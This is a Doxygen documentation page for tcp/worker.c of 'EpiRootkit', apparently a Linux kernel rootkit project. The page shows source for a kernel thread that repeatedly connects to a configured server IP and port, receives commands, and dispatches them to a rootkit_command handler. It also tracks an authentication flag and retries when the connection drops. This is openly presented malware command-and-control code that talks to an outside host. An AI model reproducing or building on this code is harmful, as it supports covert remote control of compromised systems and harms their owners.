<!-- HTML header for doxygen 1.13.2-->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
<head>
<meta http-equiv="Content-Type" content="text/xhtml;charset=UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=11"/>
<meta name="generator" content="Doxygen 1.9.8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>EpiRootkit: worker.c File Reference</title>
<!--BEGIN PROJECT_ICON-->
<link rel="icon" href="../../$projecticon" type="image/x-icon" />
<!--END PROJECT_ICON-->
<link href="../../tabs.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../jquery.js"></script>
<script type="text/javascript" src="../../dynsections.js"></script>
<!--BEGIN COPY_CLIPBOARD-->
<script type="text/javascript" src="../../clipboard.js"></script>
<!--END COPY_CLIPBOARD-->
<link href="../../navtree.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../resize.js"></script>
<script type="text/javascript" src="../../navtreedata.js"></script>
<script type="text/javascript" src="../../navtree.js"></script>
<link href="../../search/search.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../search/searchdata.js"></script>
<script type="text/javascript" src="../../search/search.js"></script>
<link href="../../doxygen.css" rel="stylesheet" type="text/css" />
<link href="../../doxygen-awesome.css" rel="stylesheet" type="text/css"/>
  <script type="text/javascript" src="../../doxygen-awesome-darkmode-toggle.js"></script>
    <script type="text/javascript">
      DoxygenAwesomeDarkModeToggle.init()
    </script>
  <script type="text/javascript" src="../../doxygen-awesome-interactive-toc.js"></script>
    <script type="text/javascript">
      DoxygenAwesomeInteractiveToc.init()
      DoxygenAwesomeInteractiveToc.hideMobileMenu = false
      DoxygenAwesomeInteractiveToc.topOffset = 45
  </script>
</head>
<body>
<div id="top"><!-- do not remove this div, it is closed by doxygen! -->
<div id="titlearea">
<table cellspacing="0" cellpadding="0">
 <tbody>
 <tr id="projectrow">
  <td id="projectlogo"><img alt="Logo" src="../../logo_no_text.png"$logosize/></td>
  <td id="projectalign">
   <div id="projectname">EpiRootkit
   </div>
   <div id="projectbrief">By STDBOOL</div>
  </td>
 </tr>
 </tbody>
</table>
</div>
<!-- end header part -->
<!-- Generated by Doxygen 1.9.8 -->
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
var searchBox = new SearchBox("searchBox", "../../search/",'.html');
/* @license-end */
</script>
<script type="text/javascript" src="../../menudata.js"></script>
<script type="text/javascript" src="../../menu.js"></script>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
$(function() {
  initMenu('../../',true,false,'search.php','Search');
  $(document).ready(function() { init_search(); });
});
/* @license-end */
</script>
<div id="main-nav"></div>
</div><!-- top -->
<div id="side-nav" class="ui-resizable side-nav-resizable">
  <div id="nav-tree">
    <div id="nav-tree-contents">
      <div id="nav-sync" class="sync"></div>
    </div>
  </div>
  <div id="splitbar" style="-moz-user-select:none;" 
       class="ui-resizable-handle">
  </div>
</div>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
$(document).ready(function(){initNavTree('d4/d33/tcp_2worker_8c.html','../../'); initResizable(); });
/* @license-end */
</script>
<div id="doc-content">
<!-- window showing the filter options -->
<div id="MSearchSelectWindow"
     onmouseover="return searchBox.OnSearchSelectShow()"
     onmouseout="return searchBox.OnSearchSelectHide()"
     onkeydown="return searchBox.OnSearchSelectKey(event)">
</div>

<!-- iframe showing the search results (closed by default) -->
<div id="MSearchResultsWindow">
<div id="MSearchResults">
<div class="SRPage">
<div id="SRIndex">
<div id="SRResults"></div>
<div class="SRStatus" id="Loading">Loading...</div>
<div class="SRStatus" id="Searching">Searching...</div>
<div class="SRStatus" id="NoMatches">No Matches</div>
</div>
</div>
</div>
</div>

<div class="header">
  <div class="summary">
<a href="#func-members">Functions</a> &#124;
<a href="#var-members">Variables</a>  </div>
  <div class="headertitle"><div class="title">worker.c File Reference</div></div>
</div><!--header-->
<div class="contents">
<div class="textblock"><code>#include &quot;<a class="el" href="../../d3/da8/hide__api_8h_source.html">hide_api.h</a>&quot;</code><br />
<code>#include &quot;<a class="el" href="../../d9/d94/network_8h_source.html">network.h</a>&quot;</code><br />
<code>#include &quot;<a class="el" href="../../d7/d72/sysinfo_8h_source.html">sysinfo.h</a>&quot;</code><br />
<code>#include &quot;<a class="el" href="../../d3/dc0/upload_8h_source.html">upload.h</a>&quot;</code><br />
</div><div class="textblock"><div class="dynheader">
Include dependency graph for tcp/worker.c:</div>
<div class="dyncontent">
<div class="center"><!-- SVG 0 --></div>
</div>
</div>
<p><a href="../../d4/d33/tcp_2worker_8c_source.html">Go to the source code of this file.</a></p>
<table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a id="func-members" name="func-members"></a>
Functions</h2></td></tr>
<tr class="memitem:af3cb573e06b73626a72c113f34ec7340" id="r_af3cb573e06b73626a72c113f34ec7340"><td class="memItemLeft" align="right" valign="top">bool&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d4/d33/tcp_2worker_8c.html#af3cb573e06b73626a72c113f34ec7340">is_user_auth</a> (void)</td></tr>
<tr class="separator:af3cb573e06b73626a72c113f34ec7340"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a043850404f54dbb1abc14ad658528669" id="r_a043850404f54dbb1abc14ad658528669"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d4/d33/tcp_2worker_8c.html#a043850404f54dbb1abc14ad658528669">set_user_auth</a> (bool auth)</td></tr>
<tr class="separator:a043850404f54dbb1abc14ad658528669"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2f07d7ffb76e09c83b2e6b18a88cae82" id="r_a2f07d7ffb76e09c83b2e6b18a88cae82"><td class="memItemLeft" align="right" valign="top">static bool&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d4/d33/tcp_2worker_8c.html#a2f07d7ffb76e09c83b2e6b18a88cae82">send_initial_message_with_retries</a> (void)</td></tr>
<tr class="separator:a2f07d7ffb76e09c83b2e6b18a88cae82"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1538df1928d20f0518ec2bdd46cdeaf9" id="r_a1538df1928d20f0518ec2bdd46cdeaf9"><td class="memItemLeft" align="right" valign="top">static bool&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d4/d33/tcp_2worker_8c.html#a1538df1928d20f0518ec2bdd46cdeaf9">receive_loop</a> (char *recv_buffer)</td></tr>
<tr class="separator:a1538df1928d20f0518ec2bdd46cdeaf9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a27e432a80775b74a89869a945fdd82eb" id="r_a27e432a80775b74a89869a945fdd82eb"><td class="memItemLeft" align="right" valign="top">static int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d4/d33/tcp_2worker_8c.html#a27e432a80775b74a89869a945fdd82eb">network_worker</a> (void *data)</td></tr>
<tr class="separator:a27e432a80775b74a89869a945fdd82eb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2854e06612012f03c99698168e68c14f" id="r_a2854e06612012f03c99698168e68c14f"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d4/d33/tcp_2worker_8c.html#a2854e06612012f03c99698168e68c14f">start_network_worker</a> (void)</td></tr>
<tr class="separator:a2854e06612012f03c99698168e68c14f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af4b33ff003ec81aed0790bfcf426a025" id="r_af4b33ff003ec81aed0790bfcf426a025"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d4/d33/tcp_2worker_8c.html#af4b33ff003ec81aed0790bfcf426a025">stop_network_worker</a> (void)</td></tr>
<tr class="separator:af4b33ff003ec81aed0790bfcf426a025"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table><table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a id="var-members" name="var-members"></a>
Variables</h2></td></tr>
<tr class="memitem:a9701dcc09cacdca5f5952a4dfc91b2e0" id="r_a9701dcc09cacdca5f5952a4dfc91b2e0"><td class="memItemLeft" align="right" valign="top">static bool&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d4/d33/tcp_2worker_8c.html#a9701dcc09cacdca5f5952a4dfc91b2e0">is_auth</a> = false</td></tr>
<tr class="separator:a9701dcc09cacdca5f5952a4dfc91b2e0"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a65d672686f8fc161c844c4c6b593f1f7" id="r_a65d672686f8fc161c844c4c6b593f1f7"><td class="memItemLeft" align="right" valign="top">static struct task_struct *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a> = NULL</td></tr>
<tr class="separator:a65d672686f8fc161c844c4c6b593f1f7"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table>
<h2 class="groupheader">Function Documentation</h2>
<a id="af3cb573e06b73626a72c113f34ec7340" name="af3cb573e06b73626a72c113f34ec7340"></a>
<h2 class="memtitle"><span class="permalink"><a href="#af3cb573e06b73626a72c113f34ec7340">&#9670;&#160;</a></span>is_user_auth()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">bool is_user_auth </td>
          <td>(</td>
          <td class="paramtype">void&#160;</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">
<p>is_user_auth - Check if the user is authenticated. Return: true if the user is authenticated, false otherwise. </p>

<p class="definition">Definition at line <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html#l00013">13</a> of file <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html">tcp/worker.c</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">   13</span>                        {</div>
<div class="line"><span class="lineno">   14</span>    <span class="keywordflow">return</span> <a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a9701dcc09cacdca5f5952a4dfc91b2e0">is_auth</a>;</div>
<div class="line"><span class="lineno">   15</span>}</div>
<div class="ttc" id="atcp_2worker_8c_html_a9701dcc09cacdca5f5952a4dfc91b2e0"><div class="ttname"><a href="../../d4/d33/tcp_2worker_8c.html#a9701dcc09cacdca5f5952a4dfc91b2e0">is_auth</a></div><div class="ttdeci">static bool is_auth</div><div class="ttdef"><b>Definition</b> <a href="../../d4/d33/tcp_2worker_8c_source.html#l00006">tcp/worker.c:6</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a id="a27e432a80775b74a89869a945fdd82eb" name="a27e432a80775b74a89869a945fdd82eb"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a27e432a80775b74a89869a945fdd82eb">&#9670;&#160;</a></span>network_worker()</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">static int network_worker </td>
          <td>(</td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>data</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">static</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">
<p>network_worker - The main function for the network worker thread. </p><dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">data</td><td>Unused parameter required by kthread API. Return: 0 on success, negative error code on failure. </td></tr>
  </table>
  </dd>
</dl>

<p class="definition">Definition at line <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html#l00106">106</a> of file <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html">tcp/worker.c</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">  106</span>                                      {</div>
<div class="line"><span class="lineno">  107</span>    <span class="keywordtype">char</span> *recv_buffer = NULL;</div>
<div class="line"><span class="lineno">  108</span>    <span class="keyword">struct </span>sockaddr_in addr = { 0 };</div>
<div class="line"><span class="lineno">  109</span>    <span class="keywordtype">unsigned</span> <span class="keywordtype">char</span> ip_binary[4] = { 0 };</div>
<div class="line"><span class="lineno">  110</span> </div>
<div class="line"><span class="lineno">  111</span>    <span class="keywordflow">if</span> (!in4_pton(<a class="code hl_variable" href="../../db/d16/config_8h.html#afbc356cd0e25d1dbbece7c10fd025fa6">ip</a>, -1, ip_binary, -1, NULL)) {</div>
<div class="line"><span class="lineno">  112</span>        <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;network_worker: invalid IPv4 address\n&quot;</span>);</div>
<div class="line"><span class="lineno">  113</span>        <span class="keywordflow">return</span> -<a class="code hl_define" href="../../db/d16/config_8h.html#a6d58f9ac447476b4e084d7ca383f5183">FAILURE</a>;</div>
<div class="line"><span class="lineno">  114</span>    }</div>
<div class="line"><span class="lineno">  115</span> </div>
<div class="line"><span class="lineno">  116</span>    addr.sin_family = AF_INET;</div>
<div class="line"><span class="lineno">  117</span>    addr.sin_port = htons(<a class="code hl_variable" href="../../db/d16/config_8h.html#a63c89c04d1feae07ca35558055155ffb">port</a>);</div>
<div class="line"><span class="lineno">  118</span>    memcpy(&amp;addr.sin_addr.s_addr, ip_binary, <span class="keyword">sizeof</span>(addr.sin_addr.s_addr));</div>
<div class="line"><span class="lineno">  119</span> </div>
<div class="line"><span class="lineno">  120</span>    <span class="keywordflow">while</span> (!kthread_should_stop()) {</div>
<div class="line"><span class="lineno">  121</span>        <a class="code hl_function" href="../../d9/d94/network_8h.html#a295724b006015077ff26ce0862d7f243">close_worker_socket</a>();</div>
<div class="line"><span class="lineno">  122</span> </div>
<div class="line"><span class="lineno">  123</span>        <span class="keywordflow">if</span> (<a class="code hl_function" href="../../d9/d94/network_8h.html#a3440590c309505a5d78c9673eccd5bd2">connect_worker_socket_to_server</a>(&amp;addr) != <a class="code hl_define" href="../../db/d16/config_8h.html#aa90cac659d18e8ef6294c7ae337f6b58">SUCCESS</a>) {</div>
<div class="line"><span class="lineno">  124</span>            msleep(<a class="code hl_define" href="../../db/d16/config_8h.html#a05522924bfac929f047180a02f014caf">TIMEOUT_BEFORE_RETRY</a>);</div>
<div class="line"><span class="lineno">  125</span>            <span class="keywordflow">continue</span>;</div>
<div class="line"><span class="lineno">  126</span>        }</div>
<div class="line"><span class="lineno">  127</span> </div>
<div class="line"><span class="lineno">  128</span>        <span class="keywordflow">if</span> (!<a class="code hl_function" href="../../d4/d33/tcp_2worker_8c.html#a2f07d7ffb76e09c83b2e6b18a88cae82">send_initial_message_with_retries</a>()) {</div>
<div class="line"><span class="lineno">  129</span>            msleep(<a class="code hl_define" href="../../db/d16/config_8h.html#a05522924bfac929f047180a02f014caf">TIMEOUT_BEFORE_RETRY</a>);</div>
<div class="line"><span class="lineno">  130</span>            <span class="keywordflow">continue</span>;</div>
<div class="line"><span class="lineno">  131</span>        }</div>
<div class="line"><span class="lineno">  132</span> </div>
<div class="line"><span class="lineno">  133</span>        recv_buffer = kmalloc(<a class="code hl_define" href="../../db/d16/config_8h.html#accf0ac1ee8fd5b93a4a6b17582a022d5">RCV_CMD_BUFFER_SIZE</a> + 1, GFP_KERNEL);</div>
<div class="line"><span class="lineno">  134</span>        <span class="keywordflow">if</span> (!recv_buffer) {</div>
<div class="line"><span class="lineno">  135</span>            <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;network_worker: failed to allocate recv_buffer\n&quot;</span>);</div>
<div class="line"><span class="lineno">  136</span>            <span class="keywordflow">break</span>;</div>
<div class="line"><span class="lineno">  137</span>        }</div>
<div class="line"><span class="lineno">  138</span> </div>
<div class="line"><span class="lineno">  139</span>        <span class="keywordflow">if</span> (!<a class="code hl_function" href="../../d4/d33/tcp_2worker_8c.html#a1538df1928d20f0518ec2bdd46cdeaf9">receive_loop</a>(recv_buffer)) {</div>
<div class="line"><span class="lineno">  140</span>            kfree(recv_buffer);</div>
<div class="line"><span class="lineno">  141</span>            recv_buffer = NULL;</div>
<div class="line"><span class="lineno">  142</span>            <a class="code hl_function" href="../../d4/d33/tcp_2worker_8c.html#a043850404f54dbb1abc14ad658528669">set_user_auth</a>(<span class="keyword">false</span>);</div>
<div class="line"><span class="lineno">  143</span>            msleep(<a class="code hl_define" href="../../db/d16/config_8h.html#a05522924bfac929f047180a02f014caf">TIMEOUT_BEFORE_RETRY</a>);</div>
<div class="line"><span class="lineno">  144</span>            <span class="keywordflow">continue</span>;</div>
<div class="line"><span class="lineno">  145</span>        }</div>
<div class="line"><span class="lineno">  146</span> </div>
<div class="line"><span class="lineno">  147</span>        <span class="keywordflow">break</span>;</div>
<div class="line"><span class="lineno">  148</span>    }</div>
<div class="line"><span class="lineno">  149</span> </div>
<div class="line"><span class="lineno">  150</span>    <span class="keywordflow">if</span> (recv_buffer)</div>
<div class="line"><span class="lineno">  151</span>        kfree(recv_buffer);</div>
<div class="line"><span class="lineno">  152</span> </div>
<div class="line"><span class="lineno">  153</span>    <a class="code hl_function" href="../../d9/d94/network_8h.html#a295724b006015077ff26ce0862d7f243">close_worker_socket</a>();</div>
<div class="line"><span class="lineno">  154</span> </div>
<div class="line"><span class="lineno">  155</span>    <span class="keywordflow">return</span> <a class="code hl_define" href="../../db/d16/config_8h.html#aa90cac659d18e8ef6294c7ae337f6b58">SUCCESS</a>;</div>
<div class="line"><span class="lineno">  156</span>}</div>
<div class="ttc" id="aconfig_8h_html_a05522924bfac929f047180a02f014caf"><div class="ttname"><a href="../../db/d16/config_8h.html#a05522924bfac929f047180a02f014caf">TIMEOUT_BEFORE_RETRY</a></div><div class="ttdeci">#define TIMEOUT_BEFORE_RETRY</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00036">config.h:36</a></div></div>
<div class="ttc" id="aconfig_8h_html_a28aac7cd72bc6ccb4340f7985d0d5449"><div class="ttname"><a href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a></div><div class="ttdeci">#define ERR_MSG(fmt, args...)</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00016">config.h:16</a></div></div>
<div class="ttc" id="aconfig_8h_html_a63c89c04d1feae07ca35558055155ffb"><div class="ttname"><a href="../../db/d16/config_8h.html#a63c89c04d1feae07ca35558055155ffb">port</a></div><div class="ttdeci">int port</div><div class="ttdef"><b>Definition</b> <a href="../../d0/d29/main_8c_source.html#l00007">main.c:7</a></div></div>
<div class="ttc" id="aconfig_8h_html_a6d58f9ac447476b4e084d7ca383f5183"><div class="ttname"><a href="../../db/d16/config_8h.html#a6d58f9ac447476b4e084d7ca383f5183">FAILURE</a></div><div class="ttdeci">#define FAILURE</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00006">config.h:6</a></div></div>
<div class="ttc" id="aconfig_8h_html_aa90cac659d18e8ef6294c7ae337f6b58"><div class="ttname"><a href="../../db/d16/config_8h.html#aa90cac659d18e8ef6294c7ae337f6b58">SUCCESS</a></div><div class="ttdeci">#define SUCCESS</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00005">config.h:5</a></div></div>
<div class="ttc" id="aconfig_8h_html_accf0ac1ee8fd5b93a4a6b17582a022d5"><div class="ttname"><a href="../../db/d16/config_8h.html#accf0ac1ee8fd5b93a4a6b17582a022d5">RCV_CMD_BUFFER_SIZE</a></div><div class="ttdeci">#define RCV_CMD_BUFFER_SIZE</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00037">config.h:37</a></div></div>
<div class="ttc" id="aconfig_8h_html_afbc356cd0e25d1dbbece7c10fd025fa6"><div class="ttname"><a href="../../db/d16/config_8h.html#afbc356cd0e25d1dbbece7c10fd025fa6">ip</a></div><div class="ttdeci">char * ip</div><div class="ttdef"><b>Definition</b> <a href="../../d0/d29/main_8c_source.html#l00006">main.c:6</a></div></div>
<div class="ttc" id="anetwork_8h_html_a295724b006015077ff26ce0862d7f243"><div class="ttname"><a href="../../d9/d94/network_8h.html#a295724b006015077ff26ce0862d7f243">close_worker_socket</a></div><div class="ttdeci">int close_worker_socket(void)</div><div class="ttdef"><b>Definition</b> <a href="../../d5/df8/socket_8c_source.html#l00043">socket.c:43</a></div></div>
<div class="ttc" id="anetwork_8h_html_a3440590c309505a5d78c9673eccd5bd2"><div class="ttname"><a href="../../d9/d94/network_8h.html#a3440590c309505a5d78c9673eccd5bd2">connect_worker_socket_to_server</a></div><div class="ttdeci">int connect_worker_socket_to_server(struct sockaddr_in *addr)</div><div class="ttdef"><b>Definition</b> <a href="../../d5/df8/socket_8c_source.html#l00059">socket.c:59</a></div></div>
<div class="ttc" id="atcp_2worker_8c_html_a043850404f54dbb1abc14ad658528669"><div class="ttname"><a href="../../d4/d33/tcp_2worker_8c.html#a043850404f54dbb1abc14ad658528669">set_user_auth</a></div><div class="ttdeci">int set_user_auth(bool auth)</div><div class="ttdef"><b>Definition</b> <a href="../../d4/d33/tcp_2worker_8c_source.html#l00022">tcp/worker.c:22</a></div></div>
<div class="ttc" id="atcp_2worker_8c_html_a1538df1928d20f0518ec2bdd46cdeaf9"><div class="ttname"><a href="../../d4/d33/tcp_2worker_8c.html#a1538df1928d20f0518ec2bdd46cdeaf9">receive_loop</a></div><div class="ttdeci">static bool receive_loop(char *recv_buffer)</div><div class="ttdef"><b>Definition</b> <a href="../../d4/d33/tcp_2worker_8c_source.html#l00059">tcp/worker.c:59</a></div></div>
<div class="ttc" id="atcp_2worker_8c_html_a2f07d7ffb76e09c83b2e6b18a88cae82"><div class="ttname"><a href="../../d4/d33/tcp_2worker_8c.html#a2f07d7ffb76e09c83b2e6b18a88cae82">send_initial_message_with_retries</a></div><div class="ttdeci">static bool send_initial_message_with_retries(void)</div><div class="ttdef"><b>Definition</b> <a href="../../d4/d33/tcp_2worker_8c_source.html#l00033">tcp/worker.c:33</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a id="a1538df1928d20f0518ec2bdd46cdeaf9" name="a1538df1928d20f0518ec2bdd46cdeaf9"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a1538df1928d20f0518ec2bdd46cdeaf9">&#9670;&#160;</a></span>receive_loop()</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">static bool receive_loop </td>
          <td>(</td>
          <td class="paramtype">char *&#160;</td>
          <td class="paramname"><em>recv_buffer</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">static</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">
<p>receive_loop - Continuously receive messages from the server. </p><dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">recv_buffer</td><td>Buffer to store received messages. This function listens for incoming messages, processes them, and handles retries in case of failures or empty messages. It stops when the thread is signaled to stop. Return: true on success, false on failure after retries. </td></tr>
  </table>
  </dd>
</dl>

<p class="definition">Definition at line <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html#l00059">59</a> of file <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html">tcp/worker.c</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">   59</span>                                            {</div>
<div class="line"><span class="lineno">   60</span>    <span class="keywordtype">unsigned</span> failure_count = 0, empty_count = 0;</div>
<div class="line"><span class="lineno">   61</span> </div>
<div class="line"><span class="lineno">   62</span>    <span class="keywordflow">while</span> (!kthread_should_stop()) {</div>
<div class="line"><span class="lineno">   63</span>        <span class="comment">// Clear the buffer before receiving</span></div>
<div class="line"><span class="lineno">   64</span>        memset(recv_buffer, 0, <a class="code hl_define" href="../../db/d16/config_8h.html#accf0ac1ee8fd5b93a4a6b17582a022d5">RCV_CMD_BUFFER_SIZE</a>);</div>
<div class="line"><span class="lineno">   65</span> </div>
<div class="line"><span class="lineno">   66</span>        <span class="keywordtype">int</span> len = <a class="code hl_function" href="../../d6/d6e/network_8c.html#a666e3b95602cc2a6ef57a2af56b0d8ef">receive_from_server</a>(recv_buffer, <a class="code hl_define" href="../../db/d16/config_8h.html#accf0ac1ee8fd5b93a4a6b17582a022d5">RCV_CMD_BUFFER_SIZE</a>);</div>
<div class="line"><span class="lineno">   67</span>        <span class="keywordflow">if</span> (<a class="code hl_variable" href="../../d3/dc0/upload_8h.html#a281121106d88af2a7aad56035f113d84">receiving_file</a>) {</div>
<div class="line"><span class="lineno">   68</span>            failure_count = 0;</div>
<div class="line"><span class="lineno">   69</span>            msleep(<a class="code hl_define" href="../../db/d16/config_8h.html#a05522924bfac929f047180a02f014caf">TIMEOUT_BEFORE_RETRY</a>);</div>
<div class="line"><span class="lineno">   70</span>            <span class="keywordflow">continue</span>;</div>
<div class="line"><span class="lineno">   71</span>        }</div>
<div class="line"><span class="lineno">   72</span> </div>
<div class="line"><span class="lineno">   73</span>        <span class="keywordflow">if</span> (len &lt;= 0) {</div>
<div class="line"><span class="lineno">   74</span>            <span class="keywordflow">if</span> (++failure_count &gt; <a class="code hl_define" href="../../db/d16/config_8h.html#af26a6d07df7d33e5973124b0ffeceb0e">MAX_MSG_SEND_OR_RECEIVE_ERROR</a>)</div>
<div class="line"><span class="lineno">   75</span>                <span class="keywordflow">return</span> <span class="keyword">false</span>;</div>
<div class="line"><span class="lineno">   76</span>            msleep(<a class="code hl_define" href="../../db/d16/config_8h.html#a05522924bfac929f047180a02f014caf">TIMEOUT_BEFORE_RETRY</a>);</div>
<div class="line"><span class="lineno">   77</span>            <span class="keywordflow">continue</span>;</div>
<div class="line"><span class="lineno">   78</span>        }</div>
<div class="line"><span class="lineno">   79</span> </div>
<div class="line"><span class="lineno">   80</span>        <span class="keywordflow">if</span> (recv_buffer[0] == <span class="charliteral">&#39;\0&#39;</span>) {</div>
<div class="line"><span class="lineno">   81</span>            <span class="keywordflow">if</span> (++empty_count &gt; <a class="code hl_define" href="../../db/d16/config_8h.html#af26a6d07df7d33e5973124b0ffeceb0e">MAX_MSG_SEND_OR_RECEIVE_ERROR</a>)</div>
<div class="line"><span class="lineno">   82</span>                <span class="keywordflow">return</span> <span class="keyword">false</span>;</div>
<div class="line"><span class="lineno">   83</span>            <span class="keywordflow">continue</span>;</div>
<div class="line"><span class="lineno">   84</span>        }</div>
<div class="line"><span class="lineno">   85</span> </div>
<div class="line"><span class="lineno">   86</span>        <span class="keywordflow">if</span> (len &lt; <a class="code hl_define" href="../../db/d16/config_8h.html#accf0ac1ee8fd5b93a4a6b17582a022d5">RCV_CMD_BUFFER_SIZE</a>)</div>
<div class="line"><span class="lineno">   87</span>            recv_buffer[len] = <span class="charliteral">&#39;\0&#39;</span>;</div>
<div class="line"><span class="lineno">   88</span>        <span class="keywordflow">else</span></div>
<div class="line"><span class="lineno">   89</span>            recv_buffer[<a class="code hl_define" href="../../db/d16/config_8h.html#accf0ac1ee8fd5b93a4a6b17582a022d5">RCV_CMD_BUFFER_SIZE</a> - 1] = <span class="charliteral">&#39;\0&#39;</span>;</div>
<div class="line"><span class="lineno">   90</span>        failure_count = empty_count = 0;</div>
<div class="line"><span class="lineno">   91</span> </div>
<div class="line"><span class="lineno">   92</span>        <a class="code hl_define" href="../../db/d16/config_8h.html#a317bf780ec5da5b783e9979da34a878d">DBG_MSG</a>(<span class="stringliteral">&quot;network_worker: received message: %s\n&quot;</span>, recv_buffer);</div>
<div class="line"><span class="lineno">   93</span>        <span class="keywordflow">if</span> (strcmp(recv_buffer, <span class="stringliteral">&quot;\n&quot;</span>) != 0) {</div>
<div class="line"><span class="lineno">   94</span>            <a class="code hl_function" href="../../da/d32/cmd_8c.html#a7ed5a3859749957ee97404fa3484b22a">rootkit_command</a>(recv_buffer, len + 1, <a class="code hl_enumvalue" href="../../db/d16/config_8h.html#aac39b55be6469395f55ff0292ad8184caa040cd7feeb588104634cdadf35abf1c">TCP</a>);</div>
<div class="line"><span class="lineno">   95</span>        }</div>
<div class="line"><span class="lineno">   96</span>    }</div>
<div class="line"><span class="lineno">   97</span> </div>
<div class="line"><span class="lineno">   98</span>    <span class="keywordflow">return</span> <span class="keyword">true</span>;</div>
<div class="line"><span class="lineno">   99</span>}</div>
<div class="ttc" id="acmd_8c_html_a7ed5a3859749957ee97404fa3484b22a"><div class="ttname"><a href="../../da/d32/cmd_8c.html#a7ed5a3859749957ee97404fa3484b22a">rootkit_command</a></div><div class="ttdeci">int rootkit_command(char *command, unsigned command_size, enum Protocol protocol)</div><div class="ttdef"><b>Definition</b> <a href="../../da/d32/cmd_8c_source.html#l00122">cmd.c:122</a></div></div>
<div class="ttc" id="aconfig_8h_html_a317bf780ec5da5b783e9979da34a878d"><div class="ttname"><a href="../../db/d16/config_8h.html#a317bf780ec5da5b783e9979da34a878d">DBG_MSG</a></div><div class="ttdeci">#define DBG_MSG(fmt, args...)</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00015">config.h:15</a></div></div>
